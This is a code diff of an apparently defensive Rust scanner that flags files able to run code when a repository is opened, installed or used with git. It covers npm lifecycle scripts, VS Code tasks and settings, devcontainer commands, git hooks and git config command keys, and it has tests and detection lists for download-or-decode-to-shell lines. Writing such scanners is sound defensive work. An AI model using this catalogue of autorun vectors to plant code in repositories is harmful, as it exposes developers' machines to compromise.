@@ -38,8 +38,15 @@ pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
     if by_presence(path, out) {
         return Vec::new();
     }
-    let Some(text) = f.text else {
-        return Vec::new();
+    // A file the decoder could not read as clean text is read lossily: a stray byte must not
+    // hide what the file runs.
+    let lossy;
+    let text = match f.text {
+        Some(t) => t,
+        None => {
+            lossy = String::from_utf8_lossy(f.bytes);
+            &*lossy
+        }
     };
     let mut cx = Cx {
         path,
@@ -58,6 +65,8 @@ pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
         vscode_tasks(&mut cx);
     } else if name == "settings.json" && in_dir == ".vscode" {
         vscode_settings(&mut cx);
+    } else if name.ends_with(".code-workspace") {
+        code_workspace(&mut cx);
     } else if name == ".devcontainer.json"
         || (name == "devcontainer.json" && dir_above(path, ".devcontainer").is_some())
     {
@@ -113,7 +122,7 @@ pub(crate) fn surfaces(f: &FileCtx, out: &mut Vec<Finding>) -> Vec<Surface> {
         gitmodules(&mut cx);
     } else if name == ".gitattributes" {
         gitattributes(&mut cx);
-    } else if path == ".git/config" {
+    } else if path_is(path, ".git/config") || path_is(path, ".git/config.worktree") {
         git_config(&mut cx);
     } else if name == ".npmrc" {
         npmrc(&mut cx);
@@ -241,17 +250,210 @@ impl Cx<'_> {
             .push(finding(self.path, severity, rule, line, why, seen, action));
     }
 
-    /// The file is JSON the reader could not parse.
-    fn unparsed(&mut self, error: &str) {
+    /// The file runs code on open or install and is JSON the reader could not parse. That is
+    /// HIGH: the tool that runs it may read what this cannot (a stray byte, padding, a cap). The
+    /// raw text is then scanned for the commands the file would start.
+    fn unparsed(&mut self, error: &str, kind: Raw) {
         self.find(
-            Severity::Medium,
+            Severity::High,
             "autorun.unparsed",
             0,
-            "This file could not be read as JSON with comments, so the scan cannot list what \
-             it starts. The editor may still read it.",
+            "This file runs code when the folder is opened or the package installed, and it \
+             could not be read as JSON with comments. The tool that runs it may read more than \
+             the scan can, so what it starts is unknown. The commands found in its raw text \
+             are listed.",
             error,
             READ_FIRST,
         );
+        raw_surfaces(self, kind);
+    }
+}
+
+/// What a file that does not parse is read as.
+#[derive(Clone, Copy)]
+enum Raw {
+    Package,
+    Tasks,
+    Devcontainer,
+    /// Runs nothing itself; the failure alone is the finding.
+    Settings,
+}
+
+/// At most this many surfaces come from the raw text of one file.
+const MAX_RAW_SURFACES: usize = 500;
+
+static JSON_STRING: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r#""((?:[^"\\]|\\.)*)""#).expect("pattern compiles"));
+
+/// The text of a JSON string body, with its escapes decoded when it reads as one.
+fn json_unescape(body: &str) -> String {
+    jsonc::parse(&format!("\"{body}\""))
+        .ok()
+        .and_then(Value::into_string)
+        .unwrap_or_else(|| body.to_string())
+}
+
+/// The strings inside a window of raw JSON, decoded.
+fn json_strings(window: &str) -> Vec<String> {
+    JSON_STRING
+        .captures_iter(window)
+        .take(MAX_RAW_SURFACES)
+        .map(|c| json_unescape(&c[1]))
+        .collect()
+}
+
+/// From a `[` or `{` at the start of `s` to its match, cut at 4,000 bytes. Strings are not
+/// skipped: this reads text that does not parse.
+fn value_window(s: &str) -> &str {
+    let mut depth = 0usize;
+    let mut end = s.len().min(4000);
+    for (i, b) in s.bytes().enumerate().take(4000) {
+        match b {
+            b'[' | b'{' => depth += 1,
+            b']' | b'}' => {
+                depth = depth.saturating_sub(1);
+                if depth == 0 {
+                    return &s[..=i];
+                }
+            }
+            _ => {}
+        }
+    }
+    while !s.is_char_boundary(end) {
+        end -= 1;
+    }
+    &s[..end]
+}
+
+/// For each `"key":` in raw JSON text: the byte offset of its value and the command it holds. A
+/// string is one command; an array of strings is one command line; every string in an object is
+/// a command.
+fn raw_values(text: &str, key: &str) -> Vec<(usize, String)> {
+    let needle = format!("\"{key}\"");
+    let mut out = Vec::new();
+    let mut pos = 0;
+    while out.len() < MAX_RAW_SURFACES
+        && let Some(i) = text[pos..].find(&needle)
+    {
+        let after = pos + i + needle.len();
+        pos = after;
+        let Some(rest) = text[after..].trim_start().strip_prefix(':') else {
+            continue;
+        };
+        let rest = rest.trim_start();
+        let start = text.len() - rest.len();
+        match rest.as_bytes().first() {
+            Some(b'"') => {
+                if let Some(m) = JSON_STRING
+                    .captures(rest)
+                    .filter(|c| c.get(0).is_some_and(|w| w.start() == 0))
+                {
+                    out.push((start, json_unescape(&m[1])));
+                }
+            }
+            Some(b'[') => {
+                let words = json_strings(value_window(rest));
+                if !words.is_empty() {
+                    out.push((start, join_args(&words)));
+                }
+            }
+            Some(b'{') => out.extend(
+                json_strings(value_window(rest))
+                    .into_iter()
+                    .map(|s| (start, s)),
+            ),
+            _ => {}
+        }
+    }
+    out
+}
+
+/// Surfaces read from the raw text of a file that did not parse: the values of the keys that
+/// start commands, and every line whose text is a download or decode piped to a shell, or a
+/// program run on a data file.
+fn raw_surfaces(cx: &mut Cx, kind: Raw) {
+    let text = cx.text;
+    let path = cx.path;
+    let (rule, trigger, dir, keys): (&'static str, Trigger, String, &[&str]) = match kind {
+        Raw::Package => (
+            "autorun.npm-lifecycle",
+            Trigger::Install,
+            parent(path).to_string(),
+            &[
+                "preinstall",
+                "install",
+                "postinstall",
+                "prepare",
+                "prepublish",
+                "prepack",
+                "start",
+                "dev",
+            ],
+        ),
+        Raw::Tasks => (
+            "autorun.vscode-folder-open",
+            Trigger::Open,
+            parent(parent(path)).to_string(),
+            &["command"],
+        ),
+        Raw::Devcontainer => (
+            "autorun.devcontainer-host",
+            Trigger::Open,
+            parent(path).to_string(),
+            &["initializeCommand"],
+        ),
+        Raw::Settings => return,
+    };
+    // Tasks that do not run on folder open are not a surface.
+    if matches!(kind, Raw::Tasks) && !text.contains("folderOpen") && !text.contains("\\u") {
+        return;
+    }
+    // Byte offset, command, and the rule, trigger and floor it is rated under.
+    let mut commands: Vec<(usize, String, &'static str, Trigger, Severity)> = Vec::new();
+    for key in keys {
+        let (rule, trigger, floor) = match kind {
+            Raw::Package => match npm_rule(key) {
+                Some(r) => r,
+                None => continue,
+            },
+            _ => (rule, trigger, Severity::Info),
+        };
+        for (at, command) in raw_values(text, key) {
+            // `start` and `dev` only count when they run a data file.
+            if floor == Severity::High && shape::classify(&command) != Shape::RunsData {
+                continue;
+            }
+            commands.push((at, command, rule, trigger, floor));
+        }
+    }
+    let mut offset = 0;
+    for line in text.split('\n') {
+        if matches!(
+            shape::classify(line),
+            Shape::FetchExec | Shape::DecodeExec | Shape::RunsData
+        ) {
+            commands.push((
+                offset,
+                line.trim().to_string(),
+                rule,
+                trigger,
+                Severity::Info,
+            ));
+        }
+        offset += line.len() + 1;
+    }
+    commands.sort_by_key(|c| c.0);
+    let (mut line, mut pos) = (1, 0);
+    for (at, command, rule, trigger, floor) in commands.into_iter().take(MAX_RAW_SURFACES) {
+        let at = at.min(text.len());
+        line += text.as_bytes()[pos..at]
+            .iter()
+            .filter(|b| **b == b'\n')
+            .count();
+        pos = at;
+        if !cx.found.iter().any(|s| s.command == command) {
+            cx.surface(rule, trigger, &command, line, &dir, floor);
+        }
     }
 }
 
@@ -308,12 +510,13 @@ fn inventory(path: &str, found: &[Surface], notes: &[String]) -> Finding {
 }
 
 /// The findings that need only the path of a tree entry, not its content: `autorun.git-hooks`
-/// (HIGH) for every entry under `.git/hooks/` whose name does not end in `.sample`. The
-/// orchestrator calls this once with the path of every entry of the tree, so a hook that is a
-/// symlink (whatever it points at) or cannot be read counts too; `surfaces` does not repeat it.
+/// (HIGH) for every entry under `.git/hooks/`, in the tree's own `.git` folder or a nested one,
+/// whose name does not end in `.sample`. The orchestrator calls this once with the path of every
+/// entry of the tree, so a hook that is a symlink (whatever it points at) or cannot be read counts
+/// too; `surfaces` does not repeat it. `lower_hook_stubs` then lowers a stock installer stub.
 pub(crate) fn entry_findings(paths: &[&str], out: &mut Vec<Finding>) {
     for path in paths {
-        let Some(hook) = path.strip_prefix(".git/hooks/") else {
+        let Some(hook) = git_hook_name(path) else {
             continue;
         };
         if hook.is_empty() || hook.ends_with(".sample") {
@@ -332,9 +535,140 @@ pub(crate) fn entry_findings(paths: &[&str], out: &mut Vec<Finding>) {
     }
 }
 
+/// The name of the hook at `path` when it is an entry of a `.git/hooks` folder.
+fn git_hook_name(path: &str) -> Option<&str> {
+    const MARK: &str = "/.git/hooks/";
+    path.strip_prefix(".git/hooks/")
+        .or_else(|| path.find(MARK).map(|i| &path[i + MARK.len()..]))
+}
+
+/// Lowers `autorun.git-hooks` to LOW for the file `f` when it is the stock stub that pre-commit,
+/// git-lfs or lefthook writes. The orchestrator offers each text file once the entry findings
+/// exist. A stub that has been edited, or any other hook, stays HIGH.
+pub(crate) fn lower_hook_stubs(f: &FileCtx, findings: &mut [Finding]) {
+    let Some(hook) = git_hook_name(f.path) else {
+        return;
+    };
+    let Some(finding) = findings
+        .iter_mut()
+        .find(|x| x.rule == "autorun.git-hooks" && x.path == f.path)
+    else {
+        return;
+    };
+    let lossy;
+    let text = match f.text {
+        Some(t) => t,
+        None => {
+            lossy = String::from_utf8_lossy(f.bytes);
+            &*lossy
+        }
+    };
+    if let Some(tool) = known_stub(hook, text) {
+        finding.severity = Severity::Low;
+        finding.why = format!(
+            "The hook is the stock stub {tool} writes, and it only starts {tool}. An edited \
+             stub would be HIGH."
+        );
+    }
+}
+
+static PRE_COMMIT_ID: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"^# ID: [0-9a-f]{32}$").expect("pattern compiles"));
+static PRE_COMMIT_PYTHON: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^INSTALL_PYTHON=([\w./+-]+|'[^'$`\\]*')$").expect("pattern compiles")
+});
+static PRE_COMMIT_ARGS: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^ARGS=\(hook-impl( --[\w-]+(=[\w./-]+)?)+\)$").expect("pattern compiles")
+});
+static LFS_GUARD: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r#"^command -v git-lfs >/dev/null 2>&1 \|\| \{ echo >&2 "[^"`$;|&<>]*"; exit 2; \}$"#,
+    )
+    .expect("pattern compiles")
+});
+
+/// The lines pre-commit writes besides its three variable lines.
+const PRE_COMMIT_LINES: &[&str] = &[
+    "#!/usr/bin/env bash",
+    "# File generated by pre-commit: https://pre-commit.com",
+    "# start templated",
+    "# end templated",
+    "HERE=\"$(cd \"$(dirname \"$0\")\" && pwd)\"",
+    "ARGS+=(--hook-dir \"$HERE\" -- \"$@\")",
+    "if [ -x \"$INSTALL_PYTHON\" ]; then",
+    "    exec \"$INSTALL_PYTHON\" -mpre_commit \"${ARGS[@]}\"",
+    "elif command -v pre-commit > /dev/null; then",
+    "    exec pre-commit \"${ARGS[@]}\"",
+    "else",
+    "    echo '`pre-commit` not found.  Did you forget to activate your virtualenv?' 1>&2",
+    "    exit 1",
+    "fi",
+];
+
+/// The tool whose generated stub `text` is, line for line; `None` for anything else.
+fn known_stub(hook: &str, text: &str) -> Option<&'static str> {
+    if text.len() > 8192 {
+        return None;
+    }
+    let lines: Vec<&str> = text.lines().map(str::trim_end).collect();
+    if lines.get(2).is_some_and(|l| PRE_COMMIT_ID.is_match(l))
+        && PRE_COMMIT_LINES.iter().all(|want| lines.contains(want))
+        && lines.iter().any(|l| PRE_COMMIT_PYTHON.is_match(l))
+        && lines.iter().any(|l| PRE_COMMIT_ARGS.is_match(l))
+        && lines.iter().all(|l| {
+            l.is_empty()
+                || PRE_COMMIT_LINES.contains(l)
+                || PRE_COMMIT_ID.is_match(l)
+                || PRE_COMMIT_PYTHON.is_match(l)
+                || PRE_COMMIT_ARGS.is_match(l)
+        })
+    {
+        return Some("pre-commit");
+    }
+    let body: Vec<&str> = lines.iter().copied().filter(|l| !l.is_empty()).collect();
+    if matches!(
+        hook,
+        "pre-push" | "post-checkout" | "post-commit" | "post-merge"
+    ) && body.len() == 3
+        && body[0] == "#!/bin/sh"
+        && LFS_GUARD.is_match(body[1])
+        && body[2] == format!("git lfs {hook} \"$@\"")
+    {
+        return Some("git-lfs");
+    }
+    // lefthook rewrites its stub between versions, so this one is judged by what it may hold:
+    // shell glue around lefthook that runs no file and downloads, decodes or deletes nothing.
+    if lines.first() == Some(&"#!/bin/sh")
+        && lines.len() <= 120
+        && text.contains("call_lefthook()")
+        && text.contains("LEFTHOOK")
+        && lines.iter().all(|l| {
+            matches!(shape::classify(l), Shape::Allowlisted | Shape::Plain)
+                && shape::files_run(&strip_shell_keyword(l)).is_empty()
+                && !["eval ", "rm ", "chmod ", "base64"]
+                    .iter()
+                    .any(|bad| l.contains(bad))
+        })
+    {
+        return Some("lefthook");
+    }
+    None
+}
+
+/// The line without the shell keyword that starts it, so the command after it can be read.
+fn strip_shell_keyword(line: &str) -> String {
+    let t = line.trim_start();
+    for kw in ["if ", "elif ", "while ", "! "] {
+        if let Some(rest) = t.strip_prefix(kw) {
+            return rest.trim_start().to_string();
+        }
+    }
+    t.to_string()
+}
+
 /// Files that are a finding by being there; true when `path` is one of them.
 fn by_presence(path: &str, out: &mut Vec<Finding>) -> bool {
-    if path.starts_with(".git/hooks/") {
+    if git_hook_name(path).is_some() {
         // `entry_findings` rates it, from the path alone.
         return true;
     }
@@ -496,13 +830,19 @@ fn ini_entries(text: &str) -> Vec<Ini> {
         if t.is_empty() || t.starts_with(['#', ';']) {
             continue;
         }
+        // `[core] key = value` is a header and an entry on one line.
+        let mut entry = t;
         if let Some(rest) = t.strip_prefix('[') {
-            if let Some(end) = rest.find(']') {
-                section = Rc::from(rest[..end].trim());
+            let Some(end) = rest.find(']') else {
+                continue;
+            };
+            section = Rc::from(rest[..end].trim());
+            entry = rest[end + 1..].trim_matches([' ', '\t']);
+            if entry.starts_with(['#', ';']) {
+                continue;
             }
-            continue;
         }
-        if let Some((k, v)) = t.split_once('=') {
+        if let Some((k, v)) = entry.split_once('=') {
             out.push(Ini {
                 line: i + 1,
                 section: Rc::clone(&section),
@@ -622,28 +962,39 @@ fn join_args(parts: &[String]) -> String {
 
 fn package_json(cx: &mut Cx) {
     let text = cx.text;
-    let Ok(v) = jsonc::parse(text) else {
-        return;
+    let v = match jsonc::parse(text) {
+        Ok(v) => v,
+        Err(e) => return cx.unparsed(&e, Raw::Package),
     };
     let scripts = script_pairs(&v);
     let dir = parent(cx.path).to_string();
     let anchor = text.find("\"scripts\"").unwrap_or(0);
     for (name, command) in &scripts {
-        let (rule, trigger, floor) = match name.as_str() {
-            "preinstall" | "install" | "postinstall" => {
-                ("autorun.npm-lifecycle", Trigger::Install, Severity::Info)
-            }
-            "prepare" | "prepublish" | "prepack" => {
-                ("autorun.npm-lifecycle", Trigger::Build, Severity::Info)
-            }
-            "start" | "dev" if runs_data(command, &scripts) => {
-                ("autorun.npm-start-data", Trigger::OptIn, Severity::High)
-            }
-            _ => continue,
+        let Some((rule, trigger, floor)) = npm_rule(name) else {
+            continue;
         };
+        // `start` and `dev` only count when they run a data file.
+        if floor == Severity::High && !runs_data(command, &scripts) {
+            continue;
+        }
         let line = key_line(text, anchor, name);
         cx.surface(rule, trigger, command, line, &dir, floor);
     }
+}
+
+/// The rule, trigger and floor of an npm script name that starts by itself; `start` and `dev`
+/// are the data-file rule (floor HIGH), which the caller applies only to a script that runs data.
+fn npm_rule(name: &str) -> Option<(&'static str, Trigger, Severity)> {
+    Some(match name {
+        "preinstall" | "install" | "postinstall" => {
+            ("autorun.npm-lifecycle", Trigger::Install, Severity::Info)
+        }
+        "prepare" | "prepublish" | "prepack" => {
+            ("autorun.npm-lifecycle", Trigger::Build, Severity::Info)
+        }
+        "start" | "dev" => ("autorun.npm-start-data", Trigger::OptIn, Severity::High),
+        _ => return None,
+    })
 }
 
 /// True when the command, or the script of the same file it asks npm to run, runs a data file.
@@ -659,10 +1010,9 @@ fn runs_data(command: &str, scripts: &[(String, String)]) -> bool {
 // VS Code and Cursor
 
 fn vscode_tasks(cx: &mut Cx) {
-    let text = cx.text;
-    let v = match jsonc::parse(text) {
+    let v = match jsonc::parse(cx.text) {
         Ok(v) => v,
-        Err(e) => return cx.unparsed(&e),
+        Err(e) => return cx.unparsed(&e, Raw::Tasks),
     };
     let Some(tasks) = v
         .as_object()
@@ -672,6 +1022,12 @@ fn vscode_tasks(cx: &mut Cx) {
         return;
     };
     let dir = parent(parent(cx.path)).to_string();
+    tasks_from(cx, tasks, &dir);
+}
+
+/// The surfaces of the tasks of a `tasks.json` or of the `tasks` block of a workspace file.
+fn tasks_from(cx: &mut Cx, tasks: &[Value], dir: &str) {
+    let text = cx.text;
     let mut walk = TaskWalk {
         by_label: HashMap::new(),
         visits: 0,
@@ -718,7 +1074,7 @@ fn vscode_tasks(cx: &mut Cx) {
                     Trigger::Open,
                     &command,
                     line,
-                    &dir,
+                    dir,
                     Severity::Info,
                 );
             }
@@ -797,9 +1153,23 @@ impl<'a> TaskWalk<'a> {
 
 /// The command line of a task or of one of its platform blocks, with the string it came from.
 fn command_of(task: &Map) -> Option<(String, String)> {
-    let command = match task.get("command") {
-        Some(Value::Str(s)) => s.clone(),
-        Some(Value::Object(o)) => o.get("value").and_then(Value::as_str)?.to_string(),
+    let given = match task.get("command") {
+        Some(Value::Object(o)) => o.get("value"),
+        other => other,
+    };
+    // A string, or an array of strings (the words of the command).
+    let (mut line, command) = match given {
+        Some(Value::Str(s)) => (s.clone(), s.clone()),
+        Some(Value::Array(a)) => {
+            let words: Vec<String> = a
+                .iter()
+                .filter_map(|w| w.as_str().map(str::to_string))
+                .collect();
+            if words.is_empty() {
+                return None;
+            }
+            (join_args(&words), words[0].clone())
+        }
         _ => {
             if task.get("type").and_then(Value::as_str) == Some("npm") {
                 let script = task.get("script").and_then(Value::as_str)?;
@@ -808,7 +1178,6 @@ fn command_of(task: &Map) -> Option<(String, String)> {
             return None;
         }
     };
-    let mut line = command.clone();
     if let Some(args) = task.get("args").and_then(Value::as_array) {
         let words: Vec<String> = args
             .iter()
@@ -826,20 +1195,169 @@ fn command_of(task: &Map) -> Option<(String, String)> {
 }
 
 fn vscode_settings(cx: &mut Cx) {
-    let text = cx.text;
-    let v = match jsonc::parse(text) {
+    let v = match jsonc::parse(cx.text) {
         Ok(v) => v,
-        Err(e) => return cx.unparsed(&e),
+        Err(e) => return cx.unparsed(&e, Raw::Settings),
+    };
+    if let Some(o) = v.as_object() {
+        settings_from(cx, o);
+    }
+}
+
+/// A `*.code-workspace` file: its `settings` block gets the rules of `settings.json` and its
+/// `tasks` block those of `tasks.json`.
+fn code_workspace(cx: &mut Cx) {
+    let v = match jsonc::parse(cx.text) {
+        Ok(v) => v,
+        Err(e) => return cx.unparsed(&e, Raw::Tasks),
     };
     let Some(o) = v.as_object() else {
         return;
     };
+    if let Some(settings) = o.get("settings").and_then(Value::as_object) {
+        settings_from(cx, settings);
+    }
+    if let Some(tasks) = o
+        .get("tasks")
+        .and_then(Value::as_object)
+        .and_then(|t| t.get("tasks"))
+        .and_then(Value::as_array)
+    {
+        let dir = parent(cx.path).to_string();
+        tasks_from(cx, tasks, &dir);
+    }
+}
+
+/// True for the `files.exclude` keys that hide the `.vscode` folder; `.vscode-test` and the like
+/// are other folders.
+fn hides_vscode(key: &str) -> bool {
+    matches!(
+        key.trim(),
+        ".vscode" | "**/.vscode" | ".vscode/**" | "**/.vscode/**"
+    )
+}
+
+/// Editor settings that name a program the editor or an extension runs: the explicit keys, and
+/// `.path`, `Path`, `.exe` or `.command` keys of the extensions listed here.
+const PROGRAM_KEYS: &[&str] = &[
+    "python.defaultInterpreterPath",
+    "python.pythonPath",
+    "typescript.tsdk",
+    "eslint.runtime",
+    "eslint.nodePath",
+    "git.path",
+    "rust-analyzer.server.path",
+    "go.goroot",
+    "dart.sdkPath",
+    "deno.path",
+    "php.validate.executablePath",
+    "ruby.interpreter.commandPath",
+    "julia.executablePath",
+];
+const PROGRAM_PREFIXES: &[&str] = &[
+    "python.",
+    "rust-analyzer.",
+    "clangd.",
+    "go.",
+    "java.",
+    "php.",
+    "ruby.",
+    "dart.",
+    "deno.",
+    "julia.",
+    "lua.",
+    "perl.",
+    "cmake.",
+    "dotnet.",
+    "terraform.",
+    "eslint.",
+    "prettier.",
+    "typescript.",
+    "git.",
+    "npm.",
+    "yarn.",
+    "mypy-type-checker.",
+    "black-formatter.",
+    "pylint.",
+    "flake8.",
+    "ruff.",
+    "isort.",
+];
+
+fn is_program_key(key: &str) -> bool {
+    PROGRAM_KEYS.contains(&key)
+        || (PROGRAM_PREFIXES.iter().any(|p| key.starts_with(p))
+            && [".path", "Path", ".exe", ".command", ".runtime"]
+                .iter()
+                .any(|s| key.ends_with(s)))
+}
+
+/// How much a program setting is worth: nothing for a bare name (found on PATH), HIGH for a
+/// path into the repo (the repo supplies the program), MEDIUM for a path outside it or one into
+/// an installed `node_modules`.
+fn program_value_severity(value: &str) -> Option<Severity> {
+    let v = value.trim();
+    if v.is_empty() || !v.contains(['/', '\\']) && !v.starts_with(['.', '~', '$']) {
+        return None;
+    }
+    let outside = v.starts_with(['/', '~', '\\'])
+        || v.as_bytes().get(1) == Some(&b':')
+        || v.starts_with("${userHome}")
+        || v.starts_with("${env:");
+    if outside {
+        return Some(Severity::Medium);
+    }
+    let rel = v
+        .trim_start_matches("${workspaceFolder}")
+        .trim_start_matches("${workspaceRoot}")
+        .trim_start_matches(['/', '\\'])
+        .trim_start_matches("./");
+    if rel.starts_with("node_modules/") {
+        return Some(Severity::Medium);
+    }
+    Some(Severity::High)
+}
+
+/// The rules of an editor settings object (`.vscode/settings.json`, or the `settings` block of a
+/// workspace file).
+fn settings_from(cx: &mut Cx, o: &Map) {
+    let text = cx.text;
+    let mut worst: Option<(Severity, &str, String)> = None;
+    for (key, value) in o.iter().filter(|(k, _)| is_program_key(k)).take(200) {
+        let Some(sev) = value.as_str().and_then(program_value_severity) else {
+            continue;
+        };
+        if worst.as_ref().is_none_or(|(s, _, _)| sev > *s) {
+            worst = Some((
+                sev,
+                key,
+                format!("{key} = {}", value.as_str().unwrap_or("")),
+            ));
+        }
+    }
+    if let Some((severity, key, seen)) = worst {
+        let why = if severity == Severity::High {
+            "An editor setting names a program inside the repo, so the editor or an extension \
+             runs code the repo supplies as soon as the folder opens."
+        } else {
+            "An editor setting names a program outside the repo for the editor or an extension \
+             to run."
+        };
+        cx.find(
+            severity,
+            "autorun.vscode-program",
+            key_line(text, 0, key),
+            why,
+            &seen,
+            READ_FIRST,
+        );
+    }
     let hides = o
         .get("files.exclude")
         .and_then(Value::as_object)
         .is_some_and(|ex| {
             ex.iter()
-                .any(|(k, val)| k.contains(".vscode") && val.as_bool() != Some(false))
+                .any(|(k, val)| hides_vscode(k) && val.as_bool() != Some(false))
         });
     if hides {
         cx.find(
@@ -874,7 +1392,7 @@ fn devcontainer(cx: &mut Cx) {
     let text = cx.text;
     let v = match jsonc::parse(text) {
         Ok(v) => v,
-        Err(e) => return cx.unparsed(&e),
+        Err(e) => return cx.unparsed(&e, Raw::Devcontainer),
     };
     let Some(o) = v.as_object() else {
         return;
@@ -1300,7 +1818,7 @@ fn setup_py(cx: &mut Cx) {
 fn pyproject(cx: &mut Cx) {
     let hit = tomlish::entries(cx.text)
         .into_iter()
-        .find(|e| e.table == "build-system" && e.key == "backend-path");
+        .find(|e| &*e.table == "build-system" && e.key == "backend-path");
     if let Some(e) = hit {
         cx.find(
             Severity::Medium,
@@ -1311,6 +1829,23 @@ fn pyproject(cx: &mut Cx) {
             &format!("backend-path = {}", e.value),
             READ_FIRST,
         );
+    }
+}
+
+/// HIGH for a program given as a path (it is a file of the repo), MEDIUM for a bare name that
+/// PATH resolves (sccache, probe-rs, wasmtime). The program is the first word of a string, or the
+/// first item of an array.
+fn program_severity(value: &str) -> Severity {
+    let v = value.trim().trim_start_matches('[').trim_start();
+    let first = v
+        .trim_start_matches(['"', '\''])
+        .split(['"', '\'', ' ', ',', '\t'])
+        .next()
+        .unwrap_or("");
+    if first.is_empty() || first.contains(['/', '\\']) || first.starts_with(['.', '$']) {
+        Severity::High
+    } else {
+        Severity::Medium
     }
 }
 
@@ -1332,7 +1867,7 @@ fn cargo_config(cx: &mut Cx) {
         ) || (at.starts_with("target.") && at.ends_with(".runner"))
         {
             (
-                Severity::High,
+                program_severity(&e.value),
                 "names a program that cargo runs in place of rustc or the tests",
             )
         } else if at == "env" || at.starts_with("env.") {
@@ -1367,7 +1902,7 @@ fn cargo_config(cx: &mut Cx) {
 fn rust_toolchain(cx: &mut Cx) {
     let hit = tomlish::entries(cx.text)
         .into_iter()
-        .find(|e| e.table == "toolchain" && e.key == "path");
+        .find(|e| &*e.table == "toolchain" && e.key == "path");
     if let Some(e) = hit {
         cx.find(
             Severity::High,
@@ -1523,7 +2058,9 @@ fn is_git_bool(v: &str) -> bool {
 
 /// `.git/config` as it came in the tree: settings that make git run a command.
 fn git_config(cx: &mut Cx) {
-    let mut first: Option<(usize, String)> = None;
+    // The strongest hit of each rule: level, line and what was seen.
+    let mut command: Option<(Severity, usize, String)> = None;
+    let mut include: Option<(usize, String)> = None;
     // The name of the current section, worked out once per section: a header can be huge.
     let mut current: Option<(Rc<str>, String)> = None;
     for e in ini_entries(cx.text) {
@@ -1531,10 +2068,11 @@ fn git_config(cx: &mut Cx) {
             .as_ref()
             .is_none_or(|(s, _)| !Rc::ptr_eq(s, &e.section))
         {
-            // The section's own name is short; a long one cannot be a name git reads.
+            // The section's own name is short; a long one cannot be a name git reads. It ends at
+            // a space (`[filter "x"]`) or a dot (`[filter.x]`).
             let name = e
                 .section
-                .split_whitespace()
+                .split([' ', '\t', '.'])
                 .next()
                 .filter(|w| w.len() <= 16)
                 .unwrap_or("")
@@ -1544,30 +2082,80 @@ fn git_config(cx: &mut Cx) {
         let name = current.as_ref().map_or("", |(_, n)| n.as_str());
         let key = e.key.to_ascii_lowercase();
         let value = unquote(&e.value);
-        let runs = match (name, key.as_str()) {
-            ("core", "fsmonitor") => !is_git_bool(value),
-            ("core", "sshcommand" | "pager" | "editor" | "hookspath") => true,
-            ("filter", "clean" | "smudge" | "process") => true,
-            ("diff", "textconv") => true,
-            ("alias", _) => value.starts_with('!'),
-            _ => false,
+        let seen = || format!("{}.{} = {}", name, e.key, e.value);
+        let level = match (name, key.as_str()) {
+            ("include" | "includeif", "path") => {
+                include.get_or_insert((e.line, seen()));
+                continue;
+            }
+            ("core", "fsmonitor") => (!is_git_bool(value)).then_some(Severity::High),
+            // husky points the hooks path at its own folder; its hooks are rated as files.
+            ("core", "hookspath") if matches!(value, ".husky" | ".husky/_") => Some(Severity::Low),
+            ("core", "sshcommand" | "pager" | "editor" | "hookspath" | "askpass" | "gitproxy")
+            | ("filter", "clean" | "smudge" | "process")
+            | ("diff", "textconv" | "external" | "command")
+            | ("merge", "driver")
+            | ("sequence", "editor")
+            | ("gpg", "program")
+            | ("remote", "uploadpack" | "receivepack") => Some(Severity::High),
+            ("credential", "helper") => {
+                let first = value.split_whitespace().next().unwrap_or("");
+                (!SAFE_CREDENTIAL_HELPERS.contains(&first)).then_some(Severity::High)
+            }
+            ("alias", _) | ("submodule", "update") => {
+                value.starts_with('!').then_some(Severity::High)
+            }
+            _ => None,
         };
-        if runs {
-            first.get_or_insert((e.line, format!("{}.{} = {}", name, e.key, e.value)));
+        if let Some(level) = level
+            && command.as_ref().is_none_or(|(s, _, _)| level > *s)
+        {
+            command = Some((level, e.line, seen()));
         }
     }
-    if let Some((line, seen)) = first {
+    if let Some((severity, line, seen)) = command {
+        let why = if severity == Severity::Low {
+            "The git config points the hooks path at the folder husky installs its hooks in; \
+             the hooks there are listed as files."
+        } else {
+            "The git config in the repo's .git folder names a command that git runs on \
+             ordinary commands such as status, diff and checkout."
+        };
         cx.find(
-            Severity::High,
+            severity,
             "autorun.git-config-command",
             line,
-            "The git config in the repo's .git folder names a command that git runs on \
-             ordinary commands such as status, diff and checkout.",
+            why,
             &seen,
-            "Do not run git in this folder. Read .git/config first.",
+            "Do not run git in this folder. Read the git config first.",
+        );
+    }
+    if let Some((line, seen)) = include {
+        cx.find(
+            Severity::High,
+            "autorun.git-config-include",
+            line,
+            "The git config pulls in another file, which can set any of the commands git runs. \
+             A fresh clone has no include.",
+            &seen,
+            "Do not run git in this folder. Read the included file first.",
         );
     }
 }
+
+/// Credential helpers git ships or the platforms install.
+const SAFE_CREDENTIAL_HELPERS: &[&str] = &[
+    "",
+    "cache",
+    "store",
+    "osxkeychain",
+    "manager",
+    "manager-core",
+    "libsecret",
+    "wincred",
+    "gnome-keyring",
+    "netrc",
+];
 
 // Package manager settings
 
@@ -1797,9 +2385,11 @@ mod tests {
     }
 
     #[test]
-    fn package_json_that_is_not_json_finds_nothing() {
+    fn package_json_that_is_not_json_is_high() {
         let (s, out) = run("package.json", r#"{"scripts": {"postinstall": "#);
-        assert!(s.is_empty() && out.is_empty());
+        assert!(s.is_empty());
+        assert_eq!(rules(&out), ["autorun.unparsed"]);
+        assert_eq!(out[0].severity, Severity::High);
     }
 
     #[test]
@@ -1937,7 +2527,7 @@ mod tests {
         let f = named(&out, "autorun.unparsed");
         assert_eq!(
             (f.severity, f.path.as_str()),
-            (Severity::Medium, ".vscode/tasks.json")
+            (Severity::High, ".vscode/tasks.json")
         );
     }
 
@@ -1986,7 +2576,7 @@ mod tests {
     #[test]
     fn a_devcontainer_the_parser_rejects_is_reported() {
         let (_, out) = run(".devcontainer.json", "{ initializeCommand }");
-        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::Medium);
+        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
     }
 
     #[test]
@@ -2360,13 +2950,13 @@ call post.bat</PreBuildEvent>
         for (text, line) in [
